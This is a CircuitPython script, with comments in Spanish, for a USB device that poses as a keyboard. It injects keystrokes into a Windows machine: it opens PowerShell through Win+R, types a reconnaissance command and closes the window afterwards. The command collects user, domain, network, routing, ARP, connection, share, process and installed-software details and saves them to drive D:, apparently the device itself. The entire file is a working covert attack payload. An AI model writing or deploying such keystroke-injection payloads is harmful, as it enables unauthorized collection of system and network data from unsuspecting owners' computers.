import time
import usb_hid
import os
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# Inicializar el teclado
keyboard = Keyboard(usb_hid.devices)
keyboard_layout = KeyboardLayoutUS(keyboard)

# Esperar un momento para que el sistema reconozca el dispositivo
time.sleep(2)

# Abrir PowerShell normal (no como administrador)
keyboard.press(Keycode.WINDOWS)
keyboard.press(Keycode.R)
keyboard.release_all()
time.sleep(0.5)

keyboard_layout.write('powershell')
time.sleep(0.5)
keyboard.press(Keycode.ENTER)
keyboard.release_all()
time.sleep(1)

# Comando para recolectar información sin privilegios elevados
command = """
$output = @()
$output += '=== USER INFORMATION ==='
$output += (whoami | Out-String)
$output += '=== USER PROFILE ==='
$output += ($env:USERPROFILE | Out-String)
$output += '=== COMPUTER NAME ==='
$output += ($env:COMPUTERNAME | Out-String)
$output += '=== USER DOMAIN ==='
$output += ($env:USERDOMAIN | Out-String)
$output += '=== NETWORK INFORMATION ==='
$output += (ipconfig | Out-String)
$output += '=== DNS SERVERS ==='
$output += (Get-DnsClientServerAddress | Out-String)
$output += '=== ARP TABLE ==='
$output += (arp -a | Out-String)
$output += '=== ROUTING TABLE ==='
$output += (route print | Out-String)
$output += '=== NETWORK CONNECTIONS ==='
$output += (netstat -an | Out-String)
$output += '=== SHARED FOLDERS ==='
$output += (net share | Out-String)
$output += '=== SYSTEM INFO ==='
$output += (systeminfo | findstr /B /C:'OS Name' /C:'OS Version' /C:'System Type' /C:'Time Zone' | Out-String)
$output += '=== RUNNING PROCESSES ==='
$output += (Get-Process | Select-Object Name, Id | Out-String)
$output += '=== INSTALLED SOFTWARE ==='
$output += (Get-WmiObject -Class Win32_Product | Select-Object Name, Version | Out-String)
$output | Out-File -FilePath D:\system_info.txt -Encoding UTF8
"""

# Escribir el comando
keyboard_layout.write(command)
time.sleep(0.5)

# Ejecutar el comando
keyboard.press(Keycode.ENTER)
keyboard.release_all()

# Esperar a que se complete la ejecución
time.sleep(5)

# Cerrar PowerShell
keyboard.press(Keycode.ALT)
keyboard.press(Keycode.F4)
keyboard.release_all()
time.sleep(0.5)

keyboard.press(Keycode.N)
keyboard.release_all()
time.sleep(1)
exit()